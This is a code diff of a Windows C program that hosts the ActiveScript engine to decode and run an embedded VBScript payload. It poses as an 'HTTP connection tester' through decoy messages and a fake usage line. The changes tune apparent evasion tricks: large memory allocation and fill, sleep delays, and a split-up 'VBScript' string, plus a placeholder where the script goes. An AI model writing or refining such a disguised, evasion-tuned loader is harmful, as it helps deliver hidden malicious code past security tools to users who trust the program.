@@ -108,17 +108,14 @@ void d(char *array, int array_size, char *se)
 
 VOID r(PWCHAR lang, char* s, char* se) {
     char *mem = NULL;
-    mem = (char *) malloc(100000023);
+    mem = (char *) malloc(10000001);
 
     if (mem != NULL) {
-        memset(mem, 00, 100000023);
+        memset(mem, 01, 10000001);
         Sleep(1);
         free(mem);
     }
 
-    printf("test http connection");
-    
-    Sleep(4);
     IActiveScriptParse     *parser;
     IActiveScript          *engine;
     MyIActiveScriptSite    mas;
@@ -129,8 +126,6 @@ VOID r(PWCHAR lang, char* s, char* se) {
     HRESULT                hr;
     OLECHAR* obj;
 
-    printf("currently testing http connection...");
-    Sleep(3);
     CLSIDFromProgID(lang, &langId);
     CoInitializeEx(NULL, COINIT_MULTITHREADED);
     
@@ -172,18 +167,17 @@ VOID r(PWCHAR lang, char* s, char* se) {
         Sleep(1);
         free(mem);
     }
+    Sleep(10);
     d(s, length, se);
-        
+    Sleep(1);
     len = MultiByteToWideChar(CP_ACP, 0, s, -1, NULL, 0);
     cs = malloc(len * sizeof(WCHAR));
     
     len = MultiByteToWideChar(CP_ACP, 0, s, -1, cs, len * sizeof(WCHAR));
 
-    printf("HTTP connection looks good!");
 
     parser->lpVtbl->ParseScriptText(
          parser, cs, 0, 0, 0, 0, 0, 0, 0, 0);  
-    Sleep(1);
     engine->lpVtbl->SetScriptState(
          engine, SCRIPTSTATE_CONNECTED);
 
@@ -196,9 +190,9 @@ VOID r(PWCHAR lang, char* s, char* se) {
 int main(int argc, char *argv[]) {
 
     
-    wchar_t *l1 = L"V";
-    wchar_t *l2 = L"BScr";
-    wchar_t *l3 = L"ipt";
+    wchar_t *l1 = L"a";
+    wchar_t *l2 = L"b";
+    wchar_t *l3 = L"c";
 
      // Calculate lengths
     size_t len1 = wcslen(l1);
@@ -208,26 +202,24 @@ int main(int argc, char *argv[]) {
     // Allocate memory for the new concatenated string
     wchar_t *result = (wchar_t *)malloc((len1 + len2 + len3 + 1) * sizeof(wchar_t)); // +1 for null terminator
     if (result == NULL) {
-        printf("Memory allocation failed\n");
+        printf("Alloc failed");
     }
 
-    Sleep(6);
+    Sleep(3);
 
-    printf("HTTP connection tester.");
-    printf("usage: http_test -t <url>");
+    printf("Test");
+    printf("usage: HTTP -a <url>");
 
     //SCRIPT COMES HERE
     
-    // Copy the first string into the result
     wcscpy(result, l1);
-    // Concatenate the second string
-    wcscat(result, l2);
     wcscat(result, l3);
-    printf("Concatenated string");
-
-    // Free the allocated memory
+    wcscat(result, l2);
+    Sleep(1);
     free(result);
-    Sleep(6);
+
+    
+    
     wchar_t *l = L"VBScript";
     r(l, sc, s);
     return 0;
